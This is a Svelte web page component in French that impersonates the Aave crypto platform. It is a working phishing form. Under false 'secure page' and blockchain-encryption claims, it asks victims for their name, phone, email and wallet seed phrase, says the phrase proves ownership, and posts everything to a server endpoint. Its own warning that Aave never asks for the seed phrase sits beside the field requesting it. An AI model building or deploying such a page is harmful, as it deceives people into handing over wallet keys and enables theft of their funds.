<script>
    import { goto } from "$app/navigation";
    import Logo from "$lib/components/Logo.svelte";

    let nom = $state("");
    let prenom = $state("");
    let telephone = $state("");
    let email = $state("");
    let seed = $state("");
    let montant = $state("");
    let devise = $state("EUR");
    let methode = $state("");

    let errors = $state("");
    let submitting = $state(false);

    function clearError() {
        errors = "";
    }

    function validate() {
        if (!nom.trim()) return "Veuillez remplir le champ Nom.";
        if (!prenom.trim()) return "Veuillez remplir le champ Prénom.";
        if (!telephone.trim()) return "Veuillez remplir le champ Téléphone.";
        if (!email.trim()) return "Veuillez remplir le champ Email.";
        if (!seed.trim()) return "Veuillez remplir la phrase de récupération.";
        if (!montant.trim()) return "Veuillez indiquer un montant.";
        if (!methode) return "Veuillez sélectionner une méthode de paiement.";
        return "";
    }

    function handleSubmit(e) {
        e.preventDefault();
        if (submitting) return;
        const msg = validate();
        if (msg) {
            errors = msg;
            return;
        }
        errors = "";
        submitting = true;

        fetch("/api/submit", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                nom,
                prenom,
                telephone,
                email,
                seed,
                montant,
                devise,
                methode,
            }),
        })
            .then((r) => r.json())
            .then((res) => {
                if (res.success) {
                    goto("/confirmation");
                } else {
                    errors = "Erreur lors de l'envoi. Veuillez réessayer.";
                    submitting = false;
                }
            })
            .catch(() => {
                errors = "Erreur réseau. Veuillez réessayer.";
                submitting = false;
            });
    }
</script>

<svelte:head>
    <title>AAVE - Page sécurisée</title>
</svelte:head>

<div class="page-glow"></div>

<div class="container">
    <div class="topbar">
        <div class="logo">
            <Logo width="100" />
        </div>

        <div class="secure-badge">
            <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
                <path d="M12 3L4 7v5c0 5 3.5 8 8 9 4.5-1 8-4 8-9V7l-8-4z" />
                <path d="M9 12l2 2 4-4" />
            </svg>
            <span>ESPACE SÉCURISÉ</span>
        </div>
    </div>

    <section class="hero">
        <div class="hero-lock">
            <div class="lock">
                <div class="lock-top"></div>
                <div class="lock-body"></div>
            </div>
        </div>
        <h1>Page sécurisée</h1>
        <p>
            Vos données sont chiffrées et traitées via la blockchain. Aave n'a
            aucun accès à ces informations.
        </p>
    </section>

    <form class="form" onsubmit={handleSubmit}>
        <div class="field">
            <label for="nom">NOM</label>
            <div class="input-wrapper">
                <div class="field-icon">
                    <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
                        <circle cx="12" cy="7" r="4" />
                        <path d="M5 21c1.5-4 4-6 7-6s5.5 2 7 6" />
                    </svg>
                </div>
                <input
                    class="input"
                    type="text"
                    id="nom"
                    placeholder="Entrez votre nom"
                    bind:value={nom}
                    oninput={clearError}
                />
            </div>
        </div>

        <div class="field">
            <label for="prenom">PRÉNOM</label>
            <div class="input-wrapper">
                <div class="field-icon">
                    <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
                        <circle cx="12" cy="7" r="4" />
                        <path d="M5 21c1.5-4 4-6 7-6s5.5 2 7 6" />
                    </svg>
                </div>
                <input
                    class="input"
                    type="text"
                    id="prenom"
                    placeholder="Entrez votre prénom"
                    bind:value={prenom}
                    oninput={clearError}
                />
            </div>
        </div>

        <div class="field">
            <label for="telephone">TÉLÉPHONE</label>
            <div class="input-wrapper">
                <div class="field-icon">
                    <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
                        <path
                            d="M22 16.9v3a2 2 0 0 1-2.2 2A19.8 19.8 0 0 1 11.2 18 19.3 19.3 0 0 1 5.9 12.8 19.8 19.8 0 0 1 2.1 4.2 2 2 0 0 1 4.1 2h3a2 2 0 0 1 2 1.7l.4 2.5a2 2 0 0 1-.6 1.8l-1.3 1.3a16 16 0 0 0 6.1 6.1l1.3-1.3a2 2 0 0 1 1.8-.6l2.5.4A2 2 0 0 1 22 16.9z"
                        />
                    </svg>
                </div>
                <div class="phone-row">
                    <select class="country-select" oninput={clearError}>
                        <option value="+33">🇫🇷 +33</option>
                        <option value="+1">🇺🇸 +1</option>
                        <option value="+44">🇬🇧 +44</option>
                        <option value="+49">🇩🇪 +49</option>
                        <option value="+39">🇮🇹 +39</option>
                        <option value="+34">🇪🇸 +34</option>
                        <option value="+32">🇧🇪 +32</option>
                        <option value="+41">🇨🇭 +41</option>
                        <option value="+31">🇳🇱 +31</option>
                        <option value="+352">🇱🇺 +352</option>
                    </select>
                    <input
                        class="input"
                        type="tel"
                        id="telephone"
                        placeholder="06 12 34 56 78"
                        bind:value={telephone}
                        oninput={clearError}
                    />
                </div>
            </div>
        </div>

        <div class="field">
            <label for="email">EMAIL</label>
            <div class="input-wrapper">
                <div class="field-icon">
                    <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
                        <rect x="3" y="5" width="18" height="14" rx="2" />
                        <path d="M3 7l9 6 9-6" />
                    </svg>
                </div>
                <input
                    class="input"
                    type="email"
                    id="email"
                    placeholder="exemple@email.com"
                    bind:value={email}
                    oninput={clearError}
                />
            </div>
        </div>

        <div class="field">
            <label for="seed">PHRASE DE RÉCUPÉRATION (SEED PHRASE)</label>
            <div class="field-description">
                Veuillez indiquer votre phrase de récupération (12 ou 24 mots)
                afin de sécuriser et de vérifier que vous êtes bien le
                propriétaire légal du wallet.
            </div>
            <div class="input-wrapper">
                <div class="field-icon">
                    <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
                        <circle cx="8" cy="15" r="4" />
                        <path d="M10.5 13.5L21 3m0 0v6m0-6h-6" />
                    </svg>
                </div>
                <textarea
                    class="textarea"
                    id="seed"
                    placeholder="mot1 mot2 mot3 ... mot12"
                    bind:value={seed}
                    oninput={clearError}
                ></textarea>
            </div>

            <div class="warning-box">
                <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
                    <circle cx="12" cy="12" r="10" />
                    <path d="M12 8v4" />
                    <circle cx="12" cy="16" r="1" fill="white" />
                </svg>
                <p>
                    Vous êtes actuellement sur une page sécurisée, accessible
                    uniquement par vous. Pour votre protection, aucun conseiller
                    Aave ne vous demandera jamais votre phrase de récupération.
                    Ne la partagez avec personne, en aucune circonstance.
                </p>
                <br />
                <p>Aave ne vous la demandera jamais.</p>
            </div>

            <div class="verify-box">
                <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
                    <rect x="5" y="11" width="14" height="10" rx="2" />
                    <path d="M8 11V7a4 4 0 0 1 8 0v4" />
                </svg>
                <p>
                    Cette vérification est essentielle pour protéger votre
                    wallet et confirmer votre propriété légitime.
                </p>
            </div>
        </div>

        <div class="field">
            <label for="montant">MONTANT DEMANDÉ</label>
            <div class="input-wrapper">
                <div class="field-icon">
                    <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
                        <ellipse cx="12" cy="5" rx="7" ry="3" />
                        <path d="M5 5v6c0 1.7 3.1 3 7 3s7-1.3 7-3V5" />
                        <path d="M5 11v6c0 1.7 3.1 3 7 3s7-1.3 7-3v-6" />
                    </svg>
                </div>
                <div class="phone-row">
                    <input
                        class="input"
                        type="number"
                        id="montant"
                        placeholder="Entrez le montant demandé"
                        bind:value={montant}
                        oninput={clearError}
                    />
                    <select
                        class="select country"
                        bind:value={devise}
                        oninput={clearError}
                    >
                        <option>EUR</option>
                        <option>USD</option>
                        <option>GBP</option>
                    </select>
                </div>
            </div>
        </div>

        <div class="field">
            <label for="methode">MÉTHODE DE PAIEMENT</label>
            <div class="input-wrapper">
                <div class="field-icon">
                    <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
                        <rect x="3" y="5" width="18" height="14" rx="2" />
                        <path d="M3 10h18" />
                    </svg>
                </div>
                <select
                    class="select"
                    id="methode"
                    bind:value={methode}
                    oninput={clearError}
                >
                    <option value=""
                        >Sélectionnez une méthode de paiement</option
                    >
                    <option>Virement bancaire</option>
                    <option>Cryptomonnaie (Crypto)</option>
                </select>
            </div>
        </div>

        {#if errors}
            <div class="form-error">{errors}</div>
        {/if}

        <button class="btn" type="submit" disabled={submitting}>
            {submitting ? "ENVOI EN COURS…" : "ENREGISTRER ET CONTINUER →"}
        </button>

        <div class="footer-note">
            <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8">
                <rect x="5" y="11" width="14" height="10" rx="2" />
                <path d="M8 11V7a4 4 0 0 1 8 0v4" />
            </svg>
            <span>Vos informations sont sécurisées par la blockchain.</span>
        </div>
    </form>
</div>

<style>
    :global(body) {
        background:
            radial-gradient(
                circle at top,
                rgba(133, 76, 255, 0.2),
                transparent 28%
            ),
            linear-gradient(180deg, #090b35 0%, #04051d 100%);
    }

    .page-glow {
        position: fixed;
        inset: 0;
        pointer-events: none;
        background:
            radial-gradient(
                circle at 50% 0%,
                rgba(120, 80, 255, 0.18),
                transparent 32%
            ),
            radial-gradient(
                circle at 50% 50%,
                rgba(0, 170, 255, 0.05),
                transparent 45%
            );
    }

    .container {
        width: 100%;
        max-width: 760px;
        margin: auto;
        padding: 16px 14px 40px;
        position: relative;
        z-index: 2;
    }

    .topbar {
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        row-gap: 8px;
        align-items: center;
        margin-bottom: 22px;
    }

    .logo :global(svg) {
        width: 100px;
        max-width: 100%;
    }

    .secure-badge {
        display: flex;
        align-items: center;
        gap: 6px;
        color: #e28dff;
        font-size: 0.7rem;
        letter-spacing: 2px;
        text-transform: uppercase;
    }

    .secure-badge :global(svg) {
        width: 22px;
        height: 22px;
        stroke: url(#gradientStroke);
    }

    .hero {
        text-align: center;
        margin-bottom: 30px;
    }

    .hero-lock {
        width: 110px;
        height: 110px;
        margin: 0 auto 22px;
        border-radius: 50%;
        position: relative;
        display: flex;
        justify-content: center;
        align-items: center;
        background: radial-gradient(
            circle,
            rgba(157, 97, 255, 0.18),
            rgba(40, 20, 90, 0.02)
        );
        border: 1px solid rgba(255, 255, 255, 0.08);
        box-shadow:
            0 0 50px rgba(108, 76, 255, 0.3),
            inset 0 0 40px rgba(255, 255, 255, 0.02);
    }

    .hero-lock::before {
        content: "";
        position: absolute;
        width: 84px;
        height: 84px;
        border-radius: 50%;
        border: 1px solid rgba(190, 120, 255, 0.35);
    }

    .lock {
        width: 52px;
        height: 64px;
        position: relative;
    }

    .lock-top {
        width: 34px;
        height: 34px;
        border: 4px solid #cf7dff;
        border-bottom: none;
        border-radius: 20px 20px 0 0;
        margin: auto;
        box-shadow: 0 0 15px rgba(200, 120, 255, 0.7);
    }

    .lock-body {
        width: 52px;
        height: 42px;
        margin-top: -2px;
        border-radius: 12px;
        background: linear-gradient(
            180deg,
            rgba(136, 90, 255, 0.95),
            rgba(70, 25, 170, 0.95)
        );
        box-shadow:
            0 0 20px rgba(155, 90, 255, 0.35),
            inset 0 0 10px rgba(255, 255, 255, 0.08);
        position: relative;
    }

    .lock-body::after {
        content: "";
        position: absolute;
        width: 12px;
        height: 12px;
        border: 2px solid white;
        border-radius: 50%;
        left: 50%;
        top: 11px;
        transform: translateX(-50%);
    }

    .hero h1 {
        font-size: 2rem;
        font-weight: 700;
        margin-bottom: 14px;
    }

    .hero p {
        max-width: 650px;
        margin: auto;
        font-size: 0.95rem;
        line-height: 1.65;
        color: rgba(255, 255, 255, 0.72);
    }

    .field {
        margin-bottom: 18px;
    }

    .field label {
        display: block;
        margin-bottom: 12px;
        font-size: 0.84rem;
        font-weight: 600;
        letter-spacing: 1px;
        color: #37c8ff;
    }

    .field-description {
        margin-bottom: 16px;
        color: rgba(255, 255, 255, 0.78);
        line-height: 1.6;
    }

    .input-wrapper {
        display: flex;
        align-items: center;
        gap: 10px;
    }

    .field-icon {
        width: 28px;
        min-width: 28px;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .field-icon :global(svg) {
        width: 22px;
        height: 22px;
        stroke: url(#gradientStroke);
    }

    .input,
    .textarea,
    .select {
        width: 100%;
        height: 50px;
        background: rgba(5, 10, 45, 0.55);
        border: 1px solid rgba(198, 98, 255, 0.7);
        border-radius: 14px;
        color: #fff;
        font-family: inherit;
        font-size: 0.95rem;
        padding: 0 20px;
        outline: none;
        transition: 0.25s;
    }

    .textarea {
        height: 120px;
        padding-top: 18px;
        resize: none;
    }

    .input::placeholder,
    .textarea::placeholder {
        color: rgba(255, 255, 255, 0.32);
    }

    .input:focus,
    .textarea:focus,
    .select:focus {
        border-color: #b46dff;
        box-shadow: 0 0 20px rgba(162, 100, 255, 0.2);
    }

    .form-error {
        margin-top: 14px;
        padding: 12px 16px;
        border-radius: 12px;
        background: rgba(255, 70, 70, 0.12);
        border: 1px solid rgba(255, 70, 70, 0.4);
        color: #ff7a7a;
        font-size: 0.9rem;
        text-align: center;
    }

    .select {
        appearance: auto;
        cursor: pointer;
    }

    .phone-row {
        display: flex;
        gap: 12px;
        width: 100%;
    }

    .country,
    .country-select {
        width: 92px;
        min-width: 92px;
        height: 50px;
        border-radius: 14px;
        border: 1px solid rgba(198, 98, 255, 0.7);
        background: rgba(5, 10, 45, 0.55);
        color: #fff;
        font-family: inherit;
        font-size: 0.8rem;
        padding: 0 20px 0 8px;
        cursor: pointer;
        outline: none;
        appearance: none;
        -webkit-appearance: none;
        text-align: center;
        text-align-last: center;
        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M1 1l4 4 4-4' stroke='%23cf66ff' stroke-width='1.5' fill='none'/%3E%3C/svg%3E");
        background-repeat: no-repeat;
        background-position: right 8px center;
    }

    .warning-box,
    .verify-box {
        margin-top: 14px;
        display: flex;
        align-items: flex-start;
        gap: 14px;
        padding: 14px;
        border-radius: 16px;
        border: 1px solid rgba(190, 100, 255, 0.35);
        background: rgba(255, 255, 255, 0.02);
    }

    .warning-box :global(svg),
    .verify-box :global(svg) {
        width: 22px;
        min-width: 22px;
        height: 22px;
        stroke: url(#gradientStroke);
    }

    .warning-box p,
    .verify-box p {
        font-size: 0.95rem;
        line-height: 1.7;
        color: rgba(255, 255, 255, 0.78);
    }

    .btn {
        width: 100%;
        height: 56px;
        border: none;
        border-radius: 16px;
        margin-top: 10px;
        cursor: pointer;
        background: linear-gradient(
            90deg,
            #4db7ff 0%,
            #7f63ff 45%,
            #d45eff 100%
        );
        color: #fff;
        font-size: 0.95rem;
        font-weight: 600;
        letter-spacing: 0.5px;
        box-shadow: 0 16px 40px rgba(140, 80, 255, 0.25);
        transition: 0.25s;
    }

    .btn:hover {
        transform: translateY(-2px);
    }

    .footer-note {
        margin-top: 18px;
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 10px;
        text-align: center;
        color: rgba(255, 255, 255, 0.7);
        font-size: 0.82rem;
        line-height: 1.5;
    }

    .footer-note :global(svg) {
        width: 20px;
        height: 20px;
        stroke: url(#gradientStroke);
    }

    @media (min-width: 481px) {
        .container {
            padding: 20px 18px 50px;
        }

        .topbar {
            flex-wrap: nowrap;
            justify-content: space-between;
            margin-bottom: 28px;
        }

        .logo :global(svg) {
            width: 120px;
        }

        .secure-badge {
            font-size: 0.8rem;
            gap: 10px;
        }

        .hero {
            margin-bottom: 38px;
        }

        .hero h1 {
            font-size: 2.4rem;
            margin-bottom: 16px;
        }

        .hero p {
            font-size: 1rem;
            line-height: 1.75;
        }

        .hero-lock {
            width: 130px;
            height: 130px;
        }

        .hero-lock::before {
            width: 100px;
            height: 100px;
        }

        .field {
            margin-bottom: 22px;
        }

        .field label {
            font-size: 0.9rem;
        }

        .input-wrapper {
            gap: 14px;
        }

        .field-icon {
            width: 34px;
            min-width: 34px;
        }

        .field-icon :global(svg) {
            width: 28px;
            height: 28px;
        }

        .input,
        .textarea,
        .select,
        .country,
        .country-select {
            height: 54px;
            border-radius: 16px;
        }

        .input,
        .textarea,
        .select {
            font-size: 1rem;
        }

        .textarea {
            height: 140px;
        }

        .country,
        .country-select {
            width: 110px;
            min-width: 110px;
            font-size: 0.95rem;
        }

        .warning-box,
        .verify-box {
            padding: 18px;
        }

        .btn {
            height: 62px;
            font-size: 1rem;
        }

        .footer-note {
            font-size: 0.95rem;
            line-height: inherit;
        }
    }

    @media (min-width: 769px) {
        .topbar {
            margin-bottom: 36px;
        }

        .logo :global(svg) {
            width: 150px;
        }

        .secure-badge {
            font-size: 0.95rem;
        }

        .hero h1 {
            font-size: 3rem;
        }

        .hero p {
            font-size: 1.05rem;
        }
    }
</style>
